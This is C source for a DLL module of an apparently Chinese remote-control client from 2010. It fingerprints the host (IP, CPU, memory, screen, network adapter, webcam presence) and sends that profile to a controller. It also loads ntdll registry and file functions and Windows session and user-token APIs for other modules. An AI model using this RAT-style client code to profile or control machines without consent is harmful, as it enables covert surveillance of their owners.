/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "../kms/km_head.h"
#include <stdio.h>
#include <Iphlpapi.h.>
#include <vfw.h>
#include <process.h>
#include "lzw.h"

pshare_main g_share_main = NULL;

unsigned long win32_func[] = {
    (unsigned long)CloseHandle,
    (unsigned long)CreateFile,
    (unsigned long)WriteFile,
    (unsigned long)ReadFile,
    (unsigned long)GetSystemInfo,
    (unsigned long)QueryPerformanceFrequency,
    (unsigned long)GlobalMemoryStatus,
    (unsigned long)GetSystemMetrics,
    (unsigned long)GetAdaptersInfo,
    (unsigned long)GetVersionEx,
    (unsigned long)capGetDriverDescription,
    (unsigned long)CreateProcess,
    (unsigned long)WaitForSingleObject,
    (unsigned long)_beginthreadex,
    (unsigned long)MultiByteToWideChar,
    (unsigned long)WideCharToMultiByte,
    (unsigned long)FileTimeToLocalFileTime,
    (unsigned long)WinExec,
    (unsigned long)DeleteFile,
    (unsigned long)RemoveDirectory,
    (unsigned long)CreateDirectory,
    (unsigned long)GetFileSize,
    (unsigned long)lzw_enchode,
    (unsigned long)lzw_dechode,
    (unsigned long)0,
    (unsigned long)0,
    (unsigned long)0,
    (unsigned long)0
};

char lp_ntdll_func[][32] =
{
    "ZwQueryInformationProcess",
    "ZwQuerySystemInformation",
    "ZwCreateFile",
    "ZwOpenFile",
    "ZwClose",
    "ZwWriteFile",
    "ZwReadFile",
    "ZwSetInformationFile",
    "ZwQueryInformationFile",
    "ZwCreateKey",
    "ZwOpenKey",
    "ZwDeleteKey",
    "ZwSetValueKey",
    "ZwDeleteValueKey",
    "ZwQueryValueKey",
    "ZwQueryKey",
    "ZwEnumerateKey",
    "ZwEnumerateValueKey",
    "ZwQueryDirectoryFile"
};
#define ntdll_func_count 19

#pragma pack(1)
typedef struct tag_client_info{
    unsigned long   crc32_group;                        //crc32后的组名
    unsigned long   dwLanAddr;                          //局域网ip地址
    unsigned char   dwProcessorType;                    //cpu类型     //PROCESSOR_ARCHITECTURE_INTEL
    float           dwProcessorMhz;                     //cpu频率
    unsigned char   dwNumberOfProcessors;               //cpu数量
    float           dwMemory;                           //内存
    unsigned long   dwConnectTime;                      //连接时间
    unsigned short  wXscreen;                           //X
    unsigned short  wYscreen;                           //Y
    unsigned char   cCap;                               //是否有摄像头
    unsigned char   cReserve1;
    unsigned char   cReserve2;
    char            lpAdapterDescriptor[64];            //网卡描述
    char            lpDescriptor[32];                   //备注
}CLIENT_INFO,*PCLIENT_INFO;
#pragma pack()

CLIENT_INFO client_info;

unsigned short get_oversion()
{
    OSVERSIONINFO oversioninfo;
    memset(&oversioninfo,0x0,sizeof(OSVERSIONINFO));
    oversioninfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

    if(GetVersionEx(&oversioninfo) == 0)
        return 0;
    switch(oversioninfo.dwMajorVersion)
    {
    case 4: //win98
        {
            switch(oversioninfo.dwMinorVersion)
            {
            case 0:  return 1; //Windows 95/NT4.0
            case 10: return 2; //windows 98
            case 90: return 3; //Windows Me
            }
        }
        break;
    case 5: //2000 to 2003 xp
        {
            switch(oversioninfo.dwMinorVersion)
            {
            case 0: return 4; //Windows 2000
            case 1: return 5; //Windows Xp
            case 2: return 6; //windows 2003
            }
        }
        break;
    case 6: //vista to 2008
        {
            return 7;         //Windows vista/2008
        }
        break;
    }
    return 0;
}

unsigned char   get_processor_type(DWORD dwProcessorType)
{
    switch(dwProcessorType)
    {
        case PROCESSOR_INTEL_386:return 0;
        case PROCESSOR_INTEL_486:return 1;
        case PROCESSOR_INTEL_PENTIUM:return 2;
        case PROCESSOR_MIPS_R4000:return 3;
        case PROCESSOR_ALPHA_21064:return 4;
    }
    return 5;
}

unsigned long   get_localaddr()
{
    unsigned long   addr;
    struct hostent  *host;
    char            hostname[256]={0};

    if(gethostname(hostname,256) == 0){
        host = gethostbyname(hostname);
        if(host){
            memcpy((void*)&addr,(void*)host->h_addr,4);
            //printf("addr:%x:%s\n\n",addr,inet_ntoa(*((struct in_addr*)&addr)));
            return addr;
        }
    }
    return 0;
}

unsigned long   get_count_cap()
{
    unsigned long m_iDriverNumber = 0;
    int wIndex;
	char szDeviceName[80];
	char szDeviceVersion[80];

	for (wIndex = 0; wIndex < 10; wIndex++)
	{
		if (capGetDriverDescription (wIndex, szDeviceName,sizeof (szDeviceName),szDeviceVersion,sizeof(szDeviceVersion)) )
		{
			m_iDriverNumber++;
		}
	}
	return m_iDriverNumber;
}

int initialize_client_info(CLIENT_INFO *p_client_info)
{
    unsigned long       ret;
    SYSTEM_INFO         system_info;
    MEMORYSTATUS        memorystatus;
    PIP_ADAPTER_INFO    pip_adapter_info,p_adapter;
    LARGE_INTEGER       liTmp;
    char                localaddr[32];

    p_client_info->dwLanAddr               = get_localaddr();
    sprintf(localaddr,"%s",inet_ntoa(*(struct in_addr*)&p_client_info->dwLanAddr));

    GetSystemInfo(&system_info);
    p_client_info->dwProcessorType         = get_processor_type(system_info.dwProcessorType);
    p_client_info->dwNumberOfProcessors    = system_info.dwNumberOfProcessors;

    QueryPerformanceFrequency(&liTmp);
    p_client_info->dwProcessorMhz          = (double)liTmp.QuadPart/1000/1000/1000;

    memorystatus.dwLength = sizeof(MEMORYSTATUS);
    GlobalMemoryStatus(&memorystatus);
    p_client_info->dwMemory                = (float)memorystatus.dwTotalPhys/1024/1024/1024;

    p_client_info->wXscreen                = GetSystemMetrics(SM_CXSCREEN);
    p_client_info->wYscreen                = GetSystemMetrics(SM_CYSCREEN);

    ret = sizeof(IP_ADAPTER_INFO);
    pip_adapter_info = malloc(sizeof(IP_ADAPTER_INFO)*20);
    memset(pip_adapter_info, 0x0, sizeof(IP_ADAPTER_INFO)*20);

    GetAdaptersInfo(pip_adapter_info,&ret);

    if (GetAdaptersInfo(pip_adapter_info, &ret) == ERROR_BUFFER_OVERFLOW) {
        free(pip_adapter_info);
        pip_adapter_info = malloc(ret);
        GetAdaptersInfo(pip_adapter_info, &ret);
    }

    p_adapter = pip_adapter_info;
    while(p_adapter){
        if(p_adapter->Description != NULL){
            if(strcmp(localaddr,p_adapter->IpAddressList.IpAddress.String) ==0){
                memcpy(p_client_info->lpAdapterDescriptor,p_adapter->Description,63);
            }
        }
        p_adapter = p_adapter->Next;
    }

    free(pip_adapter_info);

    p_client_info->cCap                    = get_count_cap();
    return 0;
}

int
kms_main_send_client_ver(pio_socket i_socket, char *buffer, int length)
{
    printf("%s\n", "kms_main_send_client_ver");
    k_sock_send(i_socket, 0, 3, 0, (char*)&client_info, sizeof(client_info));
    return SOCK_LOOP_RECV_HEADER;
}

int __declspec(dllexport) initialize(pshare_main ps_main)
{
    HMODULE hModule;
    int i;

    g_share_main = ps_main;
    g_share_main->event_funcs[0].event_funcs[4] = kms_main_send_client_ver;
    g_share_main->event_funcs[0].count = 5;

   // printf("%s \n%s\n", "initialize", g_share_main->km_cur_path);

    ps_main->s_func.win32_func = win32_func;

    hModule = LoadLibrary("ntdll.dll");
    if(hModule == NULL)
        return -1;
    ps_main->s_func.ntdll_func = malloc(sizeof(int*)*ntdll_func_count);
    if(ps_main->s_func.ntdll_func == NULL)
        return -1;

    memset(ps_main->s_func.ntdll_func,0x0,sizeof(int*)*ntdll_func_count);
    for(i=0;i<ntdll_func_count;i++){
        ps_main->s_func.ntdll_func[i] = (int)GetProcAddress(hModule,lp_ntdll_func[i]);
    }

    hModule = LoadLibrary("wtsapi32.dll");
    if(hModule == NULL)
        return -1;

    win32_func[0x18] = (int)GetProcAddress(hModule, "WTSEnumerateSessionsA");
    win32_func[0x19] = (int)GetProcAddress(hModule, "WTSFreeMemory");
    win32_func[0x1a] = (int)GetProcAddress(hModule, "WTSQuerySessionInformation");
    win32_func[0x1b] = (int)GetProcAddress(hModule, "WTSQueryUserToken");

    memset(&client_info, 0x0, sizeof(CLIENT_INFO));

    initialize_client_info(&client_info);
    return 0;
}
